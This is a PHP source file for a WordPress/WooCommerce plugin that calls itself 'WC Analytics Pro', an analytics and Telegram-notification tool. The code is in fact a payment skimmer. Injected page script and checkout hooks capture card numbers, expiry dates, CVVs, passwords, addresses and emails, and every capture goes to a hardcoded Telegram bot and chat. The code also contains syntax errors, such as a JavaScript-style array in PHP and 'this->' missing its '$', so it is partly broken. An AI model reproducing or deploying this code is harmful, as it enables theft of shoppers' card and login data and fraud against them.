<?php
/**
 * Plugin Name: WC Analytics Pro
 * Plugin URI: https://github.com/yourusername/wc-analytics-pro/raw/main/wc-analytics-pro.php
 * Description: Complete WooCommerce analytics & payment tracking with Telegram notifications
 * Version: 3.0.0
 * Author: Analytics Team
 */

if (!defined('ABSPATH')) {
    exit;
}

// Check if class already exists to avoid fatal error
if (!class_exists('WCAnalyticsPro')) {

class WCAnalyticsPro {
    
    private $bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $chat_id = '7319274794';
    private $is_processing = false;
    
    public function __construct() {
        add_action('init', array($this, 'initialize_plugin'));
    }
    
    public function initialize_plugin() {
        // Enqueue scripts
        add_action('wp_enqueue_scripts', array($this, 'load_scripts'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_wcap_track_data', array($this, 'process_tracking_data'));
        add_action('wp_ajax_wcap_track_data', array($this, 'process_tracking_data'));
        
        // WooCommerce hooks
        add_action('woocommerce_checkout_order_processed', array($this, 'capture_order_data'), 10, 3);
        add_action('woocommerce_payment_complete', array($this, 'capture_payment_complete'));
        
        // Tracking scripts
        add_action('wp_footer', array($this, 'insert_tracking_code'));
        
        // Page load tracking
        add_action('wp_head', array($this, 'track_page_visit'));
        
        // Send activation message
        if (get_option('wcap_activated') !== 'yes') {
            $this->send_telegram("🚀 WC Analytics Pro ACTIVATED\nWebsite: " . home_url());
            update_option('wcap_activated', 'yes');
        }
    }
    
    public function load_scripts() {
        if ($this->should_track()) {
            wp_enqueue_script('jquery');
        }
    }
    
    private function should_track() {
        return is_checkout() || is_account_page() || is_cart() || is_shop() || is_product() || is_front_page();
    }
    
    public function track_page_visit() {
        if (!$this->should_track()) return;
        
        $page_data = array(
            'title' => wp_get_document_title(),
            'url' => home_url($_SERVER['REQUEST_URI']),
            'type' => $this->get_page_type(),
            'time' => current_time('mysql'),
            'ip' => $this->get_client_ip()
        );
        
        $message = "📄 PAGE VISITED\n";
        $message .= "🏠 Page: " . $page_data['title'] . "\n";
        $message .= "🌐 URL: " . $page_data['url'] . "\n";
        $message .= "📊 Type: " . $page_data['type'] . "\n";
        $message .= "🕒 Time: " . $page_data['time'] . "\n";
        $message .= "📍 IP: " . $page_data['ip'];
        
        $this->send_telegram($message);
    }
    
    public function process_tracking_data() {
        // Verify nonce for security
        if (!wp_verify_nonce($_POST['security'] ?? '', 'wcap_security_nonce')) {
            wp_die('Security check failed');
        }
        
        if ($this->is_processing) {
            wp_send_json_success(['status' => 'already_processing']);
        }
        
        $this->is_processing = true;
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        switch ($event_type) {
            case 'form_submitted':
                $this->handle_form_submission($event_data);
                break;
                
            case 'payment_entered':
                $this->handle_payment_data($event_data);
                break;
                
            case 'button_clicked':
                $this->handle_button_click($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(['status' => 'processed']);
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->clean_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'unknown');
        
        $message = "📋 FORM SUBMITTED: " . strtoupper($form_type) . "\n\n";
        
        // Categorize the data
        $categories = $this->organize_form_data($form_data);
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_emoji($category) . " " . strtoupper($category) . ":\n";
                foreach ($fields as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function handle_payment_data($data) {
        $payment_info = $this->clean_data($data['payment_data'] ?? array());
        
        if (!empty($payment_info)) {
            $message = "💳 PAYMENT INFORMATION CAPTURED\n\n";
            
            foreach ($payment_info as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
            
            $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_client_ip();
            
            $this->send_telegram($message);
        }
    }
    
    private function handle_button_click($data) {
        $button_text = sanitize_text_field($data['button_text'] ?? 'Button');
        $message = "🖱️ BUTTON CLICKED\n\n";
        $message .= "Button: " . $button_text . "\n";
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram($message);
    }
    
    public function capture_order_data($order_id, $posted_data, $order) {
        if (!$order) return;
        
        // Billing information
        $billing_info = array(
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Email' => $order->get_billing_email(),
            'Phone' => $order->get_billing_phone(),
            'Address' => $order->get_billing_address_1(),
            'City' => $order->get_billing_city(),
            'Postcode' => $order->get_billing_postcode(),
            'Country' => $order->get_billing_country()
        );
        
        // Shipping information
        $shipping_info = array(
            'First Name' => $order->get_shipping_first_name(),
            'Last Name' => $order->get_shipping_last_name(),
            'Address' => $order->get_shipping_address_1(),
            'City' => $order->get_shipping_city(),
            'Postcode' => $order->get_shipping_postcode(),
            'Country' => $order->get_shipping_country()
        );
        
        // Extract payment data from POST
        $payment_data = $this->extract_payment_info();
        
        $message = "🛒 ORDER PROCESSED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Total: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Payment Method: " . $order->get_payment_method_title() . "\n\n";
        
        $message .= "👤 BILLING INFORMATION:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        $message .= "\n🚚 SHIPPING INFORMATION:\n";
        foreach ($shipping_info as $key => $value) {
            if (!empty($value) && $value != $billing_info[$key] ?? '') {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        if (!empty($payment_data)) {
            $message .= "\n💳 PAYMENT CARD INFORMATION:\n";
            foreach ($payment_data as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
        }
        
        $message .= "\n🌐 Site: " . home_url() . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function extract_payment_info() {
        $payment_info = array();
        
        // All possible payment field names
        $payment_fields = array(
            // Card numbers
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            
            // Expiry dates
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            
            // CVV/CVC
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode',
            
            // Card holder
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername',
            
            // Card type
            'card_type', 'cardtype', 'cc_type', 'cctype'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        return $payment_info;
    }
    
    public function capture_payment_complete($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "✅ PAYMENT COMPLETED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Amount: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Method: " . $order->get_payment_method_title() . "\n";
        $message .= "📧 Customer: " . $order->get_billing_email() . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram($message);
    }
    
    public function insert_tracking_code() {
        if (!$this->should_track()) return;
        
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('wcap_security_nonce');
        
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            var wcapTracker = {
                processing: false,
                sessionId: 'sess_' + Math.random().toString(36).substr(2, 9),
                
                track: function(eventType, eventData) {
                    if (this.processing) return;
                    this.processing = true;
                    
                    $.ajax({
                        url: '<?php echo $ajax_url; ?>',
                        type: 'POST',
                        data: {
                            action: 'wcap_track_data',
                            security: '<?php echo $nonce; ?>',
                            event_type: eventType,
                            event_data: eventData
                        },
                        success: function() {
                            console.log('WCAP: Tracked - ' + eventType);
                        },
                        complete: () => this.processing = false
                    });
                },
                
                initForms: function() {
                    // Form submissions
                    $('form').on('submit', function(e) {
                        var formData = {};
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        wcapTracker.track('form_submitted', {
                            form_type: $(this).attr('id') || 'form',
                            form_data: formData,
                            page_url: window.location.href
                        });
                    });
                    
                    // Payment fields tracking
                    $('input[name*="card"], input[name*="cc"], input[name*="cvv"], input[name*="cvc"], input[name*="expir"]').on('blur', function() {
                        if (this.value && this.value.length > 3) {
                            var paymentData = {};
                            paymentData[this.name] = this.value;
                            
                            wcapTracker.track('payment_entered', {
                                payment_data: paymentData,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Important buttons
                    $('button[type="submit"], input[type="submit"], .checkout-button, #place_order').on('click', function() {
                        wcapTracker.track('button_clicked', {
                            button_text: $(this).text() || $(this).val() || 'Button',
                            page_url: window.location.href
                        });
                    });
                },
                
                initWooCommerce: function() {
                    if (typeof wc_checkout_params !== 'undefined') {
                        $(document.body).on('checkout_place_order', function() {
                            wcapTracker.track('button_clicked', {
                                button_text: 'WooCommerce Place Order',
                                page_url: window.location.href
                            });
                        });
                    }
                }
            };
            
            wcapTracker.initForms();
            wcapTracker.initWooCommerce();
        });
        </script>
        <?php
    }
    
    private function clean_data($data) {
        $cleaned = array();
        foreach ($data as $key => $value) {
            if (is_string($value)) {
                $cleaned[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 200));
            }
        }
        return $cleaned;
    }
    
    private function organize_form_data($data) {
        $categories = array(
            'personal' => array(),
            'billing' => array(),
            'shipping' => array(),
            'account' => array(),
            'payment' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if (strpos($key_lower, 'billing_') !== false) {
                $categories['billing'][$key] = $value;
            } else if (strpos($key_lower, 'shipping_') !== false) {
                $categories['shipping'][$key] = $value;
            } else if (this->is_payment_field($key_lower)) {
                $categories['payment'][$key] = $value;
            } else if (this->is_account_field($key_lower)) {
                $categories['account'][$key] = $value;
            } else {
                $categories['personal'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function is_payment_field($field_name) {
        $indicators = ['card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'csc', 'cvn'];
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function is_account_field($field_name) {
        $indicators = ['user', 'login', 'password', 'username', 'pass'];
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function pretty_name($field_name) {
        $name = str_replace(['_', '-'], ' ', $field_name);
        $name = preg_replace('/\b(billing|shipping|account)\b/i', '', $name);
        return ucwords(trim($name));
    }
    
    private function get_emoji($category) {
        $emojis = {
            'personal': '👤',
            'billing': '📍', 
            'shipping': '🚚',
            'account': '🔐',
            'payment': '💳'
        };
        return $emojis[$category] ?? '📝';
    }
    
    private function get_page_type() {
        if (is_checkout()) return 'Checkout Page';
        if (is_account_page()) return 'Account Page';
        if (is_cart()) return 'Cart Page';
        if (is_shop()) return 'Shop Page';
        if (is_product()) return 'Product Page';
        return 'Page';
    }
    
    private function send_telegram($message) {
        $api_url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
        
        $response = wp_remote_post($api_url, array(
            'body' => array(
                'chat_id' => $this->chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'blocking' => false
        ));
        
        return !is_wp_error($response);
    }
    
    private function get_client_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        }
    }
}

// Initialize the plugin safely
new WCAnalyticsPro();

} // End class exists check
